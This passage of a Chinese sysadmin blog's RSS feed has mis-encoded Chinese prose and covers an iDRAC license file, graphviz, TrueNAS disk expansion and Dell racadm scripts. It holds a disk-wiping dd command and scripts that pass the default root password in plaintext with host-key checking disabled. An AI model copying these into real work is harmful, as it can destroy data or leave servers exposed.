&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dsig:SignedInfo&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:SignatureValue&amp;gt;&lt;/span&gt;Qg4Omx1ZGrVllUPbg/X25aJxK5qlNCF/G04NLwXhbmpqoplSRkCCUgb+6TvVz9b3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Ut7sSa/WjA0mv+mbcqIENTAnpveIkIOQPR3mdjCBwX2cLYieV9nOIGobxqHU7o97
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;QjbSAkmTHcRo0PI6mP8tc7Od4WNWMZ48rrUBeOrVOr1EZeptPUbeaSofy4nvlzbC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pcpzZLbjAITT157r9KiFe9joG2hCEClrQPO0ScXHgKXrAWrQE9wX7e2De4uCvJwI
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hGWpJzDQNJJZbsWhDoZJn/59G/KRjzxIHIzIpUt1XPPIGHl5yMXDaRFcIMES0RuJ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SWZS8tt9E001Fr/8/jQNgA==&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dsig:SignatureValue&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:KeyInfo&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:X509Data&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:X509Certificate&amp;gt;&lt;/span&gt;MIIDTjCCAjagAwIBAgIBATANBgkqhkiG9w0BAQUFADBRMRMwEQYDVQQKEwpEZWxs
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LCBJbmMuMSEwHwYDVQQLExhFbWJlZGRlZCBMaWNlbnNlIE1hbmFnZXIxFzAVBgNV
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BAMTDkNBIENlcnRpZmljYXRlMB4XDTEwMDEwMTAwMDAwMFoXDTM1MTIzMTIzNTk1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OVowVjETMBEGA1UEChMKRGVsbCwgSW5jLjEhMB8GA1UECxMYRW1iZWRkZWQgTGlj
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ZW5zZSBNYW5hZ2VyMRwwGgYDVQQDExNTaWduaW5nIENlcnRpZmljYXRlMIIBIjAN
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqbRo2DZtkjxl5YtqD5ePYdzrWbkU
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;YQJwVaWYe1tE7ZAdou5TLTsjPnaa1cLcPTexn+cq8YjukIVwkwJP7yJ5GkrYGUnf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0Q6unWWgwcgTStlpflz31e8AbxXqNYZEFvEktojYS0kAfiYES+H02GUU5PtV7B9Y
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BbtZEowU2DPuqRGG1FF8mAsp1vojcbQGx+nS2Of47oQJRrJlh28COXyf2w/+IRAz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RmeYin+9pisfrT9fmlUtxa7sAAV/KZFRx8ED31YiktXgI/u/PNnHlchiCMaL6pzA
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HMBf115O7A2y6IZ9sXUHvH8V9QnDkWT1XHMn8GCW8HXOA5zA232OxiaRmQIDAQAB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;oywwKjAJBgNVHRMEAjAAMB0GA1UdDgQWBBQAoZ7yMjDHMAFtmmmO/zyz3BJ6hjAN
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BgkqhkiG9w0BAQUFAAOCAQEAHHgoOg57S+lAEejahdBE1HMwe6BF3b9bzUMCynn9
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;7buXa3cnRFO3H3674WKU6nBjv4nkT3qMyXwgi7MvXcu69msK4eM6QA8XeC7G1rD+
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2bb/ENR9R9Zo0BWLym/ij8uUA/BzX8hnbzWxN82+FMdY9WD4fJAJwJ5ZPEbU1Vfy
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;7wOWosHgDPXjeAhlhkxDQi6vlRTJdfED6tBY7iGD4AQXfzrHzAZpZlIvKbM2c54B
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;65wMSlqfEWMBDhT5qcwGCq82hmi7/sCtu9Z20g2s9F0fp4XlGX8L7l0hCa46zjay
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;37GffYsScEDFg/DmkIpcXnGzyx8l1msLzpj8Gt4zHhPlgA==&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dsig:X509Certificate&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dsig:X509Data&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dsig:KeyInfo&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dsig:Signature&amp;gt;&amp;lt;/lns:LicenseClass&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ–‡ä»¶ä¸‹è½½ï¼š&lt;a href=&#34;iDRAC7_Ent_Trial.xml&#34;&gt;iDRAC7_Ent_Trial.xml&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>åˆ©ç”¨graphvizæè¿°è¯­è¨€ç»˜å›¾</title>
      <link>https://rendoumi.com/posts/20230403-graphviz/</link>
      <pubDate>Mon, 03 Apr 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230403-graphviz/</guid>
      <description>&lt;p&gt;graphvizæ˜¯å¾ˆå¼ºçƒˆçš„æè¿°è¯­è¨€ç»˜å›¾å·¥å…·&lt;/p&gt;
&lt;p&gt;å®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install graphviz æˆ– yum install graphviz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”Ÿæˆpng&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dot -Tpng hn.gv -o hn.png
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;vi hg.gv
digraph MyGraph {
  compound = true
  margin=&amp;quot;0,0&amp;quot;
  ranksep = 1
  nodesep = 1
  rankdir=LR
  {rank=same;é˜²ç«å¢™;æ—¥å¿—å®¡è®¡}

  subgraph cluster_app {
    label=&amp;quot;æµ·å—åº”ç”¨&amp;quot;
    rankdir=LR
    margin = 10
    {rank=same;app01;app02}
    app01 [label=&amp;quot;app01\nå†…ç½‘ï¼š192.168.0.10&amp;quot;]
    app02 [label=&amp;quot;app02\nå†…ç½‘ï¼š192.168.0.11&amp;quot;]
    storage01 [label=&amp;quot;storage01\nå†…ç½‘ï¼š192.168.0.30&amp;quot;]

    subgraph cluster_db {
      style = dotted
      label=&amp;quot;æ•°æ®åº“ä¸»/å¤‡&amp;quot;
      {rank=same;db02;db01}
      db01 [label=&amp;quot;db01\nå†…ç½‘ï¼š192.168.0.20&amp;quot;]
      db02 [label=&amp;quot;db02\nå†…ç½‘ï¼š192.168.0.21&amp;quot;]
      db01 -&amp;gt; db02 [dir=both]
    }

    app01 -&amp;gt; db01 [splines=true,lhead=cluster_db]
    app02 -&amp;gt; db01 [splines=true,lhead=cluster_db]
    app01 -&amp;gt; storage01
    app02 -&amp;gt; storage01
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;â€‹&lt;/p&gt;</description>
    </item>
    <item>
      <title>TrueNASç³»ç»Ÿå¦‚ä½•å¢åŠ æ–°ç¡¬ç›˜</title>
      <link>https://rendoumi.com/posts/20230331-truenas_adddisk/</link>
      <pubDate>Fri, 31 Mar 2023 11:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230331-truenas_adddisk/</guid>
      <description>&lt;p&gt;ä¹‹å‰å…¬å¸ä¸–çºªäº’è”å’Œæ— é”¡çš„TureNASç°æœ‰ç¡¬ç›˜éƒ½æ˜¯38å—ï¼Œæ»¡é…æ˜¯60å—ï¼Œæ‰€ä»¥éƒ½éœ€è¦æ‰©å®¹ï¼Œæ‰©æ»¡å†å¢åŠ 22å—ã€‚&lt;/p&gt;
&lt;p&gt;TrueNASçš„Raidæ˜¯ä½¿ç”¨çš„RaidZ3ï¼ŒåŸºäºZFSçš„ï¼Œæœ€å¤šå…è®¸3å—ç›˜å&lt;/p&gt;
&lt;p&gt;é¦–å…ˆä¼šå»ºç«‹zpoolï¼Œç„¶ååœ¨zpoolé‡Œé¢å¢åŠ vdevï¼Œæ³¨æ„ï¼Œvdevä¸€æ—¦å¢åŠ ï¼Œä¸å¯æ›´æ”¹ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¿™é‡Œå°±çŠ¯äº†ç¬¬ä¸€ä¸ªé”™è¯¯ï¼Œæ‰€æœ‰vdevçš„ç£ç›˜æ•°é‡æœ€å¥½ç›¸ç­‰ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡åº”è¯¥å…ˆå¢åŠ 30å—ç›˜ï¼Œç„¶åç¬¬äºŒæ¬¡å†å¢åŠ 30å—ï¼Œè¿™æ ·ä¸¤ä¸ªvdevå°±æ˜¯å‡è¡¡çš„&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬è¿™ç§çŠ¶å†µï¼Œç¬¬ä¸€ä¸ªvdevæ˜¯38å—ï¼Œç¬¬äºŒä¸ªvdevæ˜¯22å—ï¼Œä¸å¯¹ç­‰äº†ï¼Œä¼šè­¦å‘Š&lt;/p&gt;
&lt;p&gt;å…·ä½“æ·»åŠ æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæµªæ½®å·¥ç¨‹å¸ˆåˆ°ç°åœºåŠ ç›˜ï¼Œç›˜å¿…é¡»åšå¥½æ¸…é™¤ä¿¡æ¯ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤é€šè¿‡&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dd &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&#34;nv&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/da59 &lt;span class=&#34;nv&#34;&gt;bs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1M &lt;span class=&#34;nv&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;ç„¶åæ’å¥½ç›˜åå¿…é¡»é‡å¯trunasæ‰èƒ½æ­£å¸¸è®¤å‡ºç›˜æ¥ä¸èƒ½çƒ­æ’æ‹”å¾ˆå¥‡æ€ª&#34;&gt;ç„¶åæ’å¥½ç›˜åï¼Œå¿…é¡»é‡å¯Trunasï¼Œæ‰èƒ½æ­£å¸¸è®¤å‡ºç›˜æ¥ï¼Œä¸èƒ½çƒ­æ’æ‹”ï¼ˆå¾ˆå¥‡æ€ªï¼‰&lt;/h1&gt;
&lt;p&gt;Storage &amp;ndash;&amp;gt; Pools &amp;ndash;&amp;gt; ç‚¹å‡»é½¿è½® &amp;ndash;&amp;gt; Add Vdevs&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230331-truenas_adddisk/2022-04-13_093345.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åé€‰ä¸­æ‰€æœ‰å·¦è¾¹çš„Available Disksï¼Œç§»åˆ°å³è¾¹çš„Data VDevs
ç„¶åçœ‹æœ€ä¸‹é¢ä¼šç«‹åˆ»å‡ºçº¢è‰²è­¦å‘Šï¼Œæç¤ºä¸¤ä¸ªvdevçš„disksä¸å¯¹ç­‰&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230331-truenas_adddisk/2022-04-13_093530.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»ADD VDEVSï¼Œä¼šå¼¹çª—è­¦å‘Šï¼Œé€‰ä¸­Confirmï¼Œç„¶åç‚¹Continue&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230331-truenas_adddisk/2022-04-13_093714.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¼šç»§ç»­å¼¹å‡ºä¸€ä¸ªè­¦å‘Šçª—ï¼Œè¿™å›å°±æ˜æ™°äº†ï¼Œæ—§çš„æ•°æ®ä¸ä¼šç ´åï¼Œç„¶åç»§ç»­é€‰ä¸­Confirmï¼Œç„¶åç‚¹ADD VDEVS&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230331-truenas_adddisk/2022-04-13_093847.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå°±ä¼šå¼€å§‹åˆå§‹åŒ–ç¡¬ç›˜&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230331-truenas_adddisk/2022-04-13_094112.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ€åæŸ¥çœ‹zpoolï¼Œçœ‹åˆ°æœ‰ä¸¤ä¸ªRAIDZ3ï¼Œå°±åŠ å¥½äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230331190700157&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230331-truenas_adddisk/image-20230331190700157.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>dellæœåŠ¡å™¨idracå¸¸ç”¨æ“ä½œè„šæœ¬</title>
      <link>https://rendoumi.com/posts/20230331-idrac_dell/</link>
      <pubDate>Fri, 31 Mar 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230331-idrac_dell/</guid>
      <description>&lt;p&gt;æ”¶å½•ä¸€ä¸‹ dell æœåŠ¡å™¨ idrac æ“ä½œå¸¸ç”¨è„šæœ¬&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;æ˜¾ç¤ºRaidå¡ç¡¬ç›˜
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get controllers
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get vdisks
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get pdisks 

æ¸…ç†Foreignç£ç›˜çŠ¶æ€
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm  storage clearconfig:RAID.Integrated.1-1
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime

åˆ é™¤vdisk
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.14 racadm raid deletevd:Disk.Virtual.0:RAID.Integrated.1-1
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime

å»ºç«‹Raid0
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r0 -wp wb -rp ra -name raid_0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Integrated.1-1
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime

å»ºç«‹Raid5
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r5 -wp wb -rp ra -name raid_5 -pdkey:Disk.Bay.1:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.2:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.3:Enclosure.Internal.0-1:RAID.Integrated.1-1
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime

é‡å¯æœåŠ¡å™¨
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset

è®¾ç½®ç¡¬ç›˜ç¬¬ä¸€å¯åŠ¨ï¼Œç¦æ­¢F1/F2ç­‰å¾…
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.biosbootsettings.BootSeq HardDisk.List.1-1,NIC.Integrated.1-1-1
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.MiscSettings.ErrPrompt Disabled
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.16 racadm jobqueue create BIOS.Setup.1-1 
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset

è®¾ç½®vnc
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.enable Enabled
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.Password calvin

è®¾ç½®idracå…¶ä»–ç”¨æˆ·
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminUserName -i 4 newuser
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 123456
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPrivilege -i 4 0x000001ff
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminEnable -i 4 1
æ”¹æ‰å¯†ç 
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 987654

NTPçš„è®¾ç½®
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.ipv4static.dns1 8.8.8.8
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 0.asia.pool.ntp.org
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 1.asia.pool.ntp.org
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 2.asia.pool.ntp.org
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 129.250.35.250
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 180.211.88.50
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 202.112.29.82
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPEnable Enabled
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPMaxDist 16
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.time.timezone Japan

ä¿®æ”¹ç½‘å¡å¯åŠ¨ä¸ºLegacy PXE
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set nic.nicconfig.1.legacybootproto PXE
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy
sshpass -p &amp;quot;calvin&amp;quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create NIC.Integrated.1-1-1
ipmitool -I lanplus -H $ip -U root -P calvin chassis power reset
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>TureNASç³»ç»Ÿåœ¨æµªæ½®å®šåˆ¶ç³»ç»Ÿä¸Šçš„å®‰è£…</title>
      <link>https://rendoumi.com/posts/20230330-truenas_install/</link>
      <pubDate>Thu, 30 Mar 2023 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230330-truenas_install/</guid>
      <description>&lt;p&gt;æ— é”¡æµªæ½®TrueNASç³»ç»Ÿçš„å®‰è£…&lt;/p&gt;
&lt;p&gt;è¿™ä¸€ç‰ˆçš„æµªæ½®å®šåˆ¶NASæœºå™¨æ¯”è¾ƒç‰¹åˆ«ï¼Œæ²¡æœ‰ä»»ä½•Raidå¡ï¼Œé…äº†Avagoçš„ä¸€å—pcie sasç›´é€šå¡ï¼šæé€š9400å¡&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_135251.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ˜¯å®šåˆ¶æœºï¼Œæ•´ä½“4Uçš„é«˜åº¦ï¼Œæ»¡é…æ˜¯60å—16Tçš„å¤§ç›˜ï¼Œä¸»æ¿åœ¨æœºç®±ä¾§é¢ç«‹ç€ï¼Œ2å—å°ç›˜åšç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºæœºæˆ¿é™åˆ¶ï¼Œæ— æ³•ç›´æ¥ä»æœ¬åœ°è®¿é—®10.18.30.97ï¼Œå¯¼è‡´æ— æ³•å°†æœ¬åœ°æ–‡ä»¶æŒ‚å…¥idracçš„cdromï¼Œåªèƒ½æ›²çº¿æ•‘å›½ï¼Œåœ¨172.18.31.2å»ºç«‹ä¸€ä¸ªnfs shareï¼ŒæŠŠå…‰ç›˜æ–‡ä»¶æ”¾è¿›å»&lt;/p&gt;
&lt;p&gt;åˆ° idrac çš„ Remote control ï¼Œ å†åˆ°Virtual mediaï¼Œé…å¥½nfså…±äº«
ip: 172.18.31.2
path: /export/nfsshare&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_130429.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åœ¨remote image redirctionä¸­å¯ä»¥çœ‹åˆ°å…‰ç›˜æ–‡ä»¶ï¼Œç‚¹å‡»Start&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_130507.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åé‡å¯ï¼ŒCDROMæ˜¯ç¬¬ä¸€å¯åŠ¨åª’ä»‹&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_100332.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¼€å§‹å®‰è£…ï¼Œç¼ºçœä¼šè¿›å…¥ç¬¬ä¸€é¡¹è¿›è¡Œå®‰è£…&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_100437.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åä¼šæŠ¥è¿™ä¸ªé”™ï¼Œpanic: AP #1 (PHY# 2) failed!&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_095148.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è§äº†é¬¼äº†ï¼Œå”¯ä¸€çš„åœ°æ–¹å¯èƒ½æ˜¯ä¸»æ¿éƒ¨åˆ†å’Œåšé€šå¡å†²çªï¼Œæˆ‘ä»¬é‡å¯è¿›å…¥BIOSï¼Œåˆ°SATAå’ŒsSATAçš„åœ°æ–¹&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_134550.png&#34;&gt;&lt;/p&gt;
